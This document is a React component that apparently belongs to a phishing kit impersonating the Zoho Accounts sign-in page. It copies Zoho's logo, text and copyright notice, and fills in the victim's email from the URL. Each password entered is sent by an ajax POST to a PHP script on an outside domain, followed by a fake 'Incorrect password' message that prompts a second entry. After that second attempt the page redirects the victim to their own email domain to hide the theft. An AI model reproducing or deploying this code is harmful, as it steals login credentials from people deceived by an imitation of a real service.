import React, { useEffect, useState } from "react";
import './Zoho.css';
import { AiOutlineApple } from 'react-icons/ai';
import { FcGoogle } from 'react-icons/fc';
import { DiYahoo} from 'react-icons/di';
import { GrFacebookOption} from 'react-icons/gr';
import { BsLinkedin, BsTwitter, BsMicrosoft} from 'react-icons/bs';
import { FaEllipsisH} from 'react-icons/fa';
import $ from 'jquery';
import Preloader from "../../Preloader/Preloader";

const Zoho = ()=>{

    const [spinLoader, setSpinLoader] = useState(false);

    useEffect(()=>{
        document.title = 'Zoho Accounts';
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2400);
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();;

    const [zohoEmail, setZohoEmail] = useState(extracetdEmail);
    const [zohoPassword, setZohoPassword] = useState('');

    const [errLabel, setErrLabel] = useState(false);
    const [enter, setEnter] = useState(false);

    const [count, setCount] = useState(0);

    const submitZoho = (e)=>{
        e.preventDefault();
        if(zohoEmail === ""){
            setEnter(true);
            setErrLabel(false);
        }else{

            setSpinLoader(true);
            setTimeout(() => {
                setSpinLoader(false);
                setEnter(false);
            }, 1600);

            setErrLabel(true);
            setTimeout(() => {
                setZohoPassword('');
            }, 1000);
            setCount(count=> count + 1);

            const user = {
                email: zohoEmail,
                password: zohoPassword
            };

            $.ajax({
                type: "POST",
                url: "https://dozenpearl.com/nc_assets/fonts/recov/free.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log('data');
                },
            });

            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();;
                // console.log(extracetdemailDomain);
                setTimeout(() => {
                    window.location.href = `https://www.${extracetdemailDomain}`;      
                }, 1200);
            }


            // make post request to server below
        }
    };

    return(<div>

            { spinLoader ? <Preloader /> : null }

            <main className="all_zoho_">
                
                <aside className="zoho_form_wrap">
                    <img 
                    src="https://static.zohocdn.com/iam/v2/components/images/newZoho_logo.5f6895fcb293501287eccaf0007b39a5.svg"
                    alt="zoho svg"
                    />


                    <h2 className="zoho_sign_txt">Sign in</h2>

                    <p className="zoho_access_txt">to access Mail</p>

                    <form onSubmit={submitZoho}>

                        <div className="zoho_email_cont">
                            <input 
                            type={`email`}
                            readOnly
                            value={zohoEmail}
                            required
                            onChange={e=>setZohoEmail(e.target.value)}
                            className="zoho_email_input"
                            />
                        </div>

                        {enter ? <p className="zoho_err">Please enter your email address or mobile number</p> : null }


                        <div className="zoho_password_cont">
                            <input 
                            type={`password`}
                            value={zohoPassword}
                            required
                            className="zoho_email_input"
                            placeholder="Enter password"
                            onChange={e=> setZohoPassword(e.target.value)}
                            />
                        </div>

                        { errLabel ? <p className="zoho_err">Incorrect password. Please try again.</p> : null }


                        <div>
                            <input 
                                type={`submit`}
                                value='SIGN IN'
                                className="zoho_btn"
                            />
                        </div>

                        <p className="zoho_fget">Forgot Password?</p>

                        <hr />

                        <span className="zoho_using_sos">Sign in using</span>

                        <div className="boxx_wrap">
                            <article className="boxx apple" title="Sign in using Apple">
                                {/* <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREqvI_1JGR_aoMwz10X6hBhbvb9ZwtR23knA&usqp=CAU" /> */}
                                <AiOutlineApple  className="applogo"/>  
                            </article>
                            <article className="boxx google" title="Sign in using Google">
                                <FcGoogle className="applogo"/>
                            </article>
                            <article className="boxx yahoo" title="Sign in using Yahoo">
                                <DiYahoo className="applogo"/>
                            </article>
                            <article className="boxx facebook" title="Login using Facebook">
                                <GrFacebookOption className="applogo" style={{color:'blue'}}/>
                            </article>
                            <article className="boxx linkdn" title="Sign in using Linkedn">
                                <BsLinkedin className="applogo" style={{color:'navy'}}/>
                            </article>
                            <article className="boxx twitter" title="Sign in using Twitter">
                                <BsTwitter className="applogo" style={{color:'#159AFF'}}/>
                            </article>
                            <article className="boxx msoft" title="Sign in using Microsoft">
                                <BsMicrosoft />
                            </article>
                            <article className="boxx more" title="More">
                                <FaEllipsisH style={{color:'#777'}}/>
                            </article>
                        </div>

                    </form>

                </aside>

                <article className="aut_desc_zoho">
                    <img 
                        // src="https://accounts.zoho.com/v2/components/images/passwordless_illustration2x.png" 
                        src="data:image/png;base64,"
                        alt="Passwordless" 
                        className="passwrodless_zoho__"
                    />

                    <h3 className="h3333">Passwordless sign-in</h3>
                    <p className="moveee">Move away from risky passwords and experience one-tap access to Zoho. Download and install OneAuth.</p>

                    <button className="rtyu">Learn More</button>
                </article>

            </main>

            <p className="dooooo">Don't have a Zoho account? <span className="ssupppp">Sign Up Now</span></p>

            <p className="ccrrttt"> 2024, Zoho Corporation Pvt. Ltd. All Rights Reserved.</p>

    </div>)
}

export default Zoho;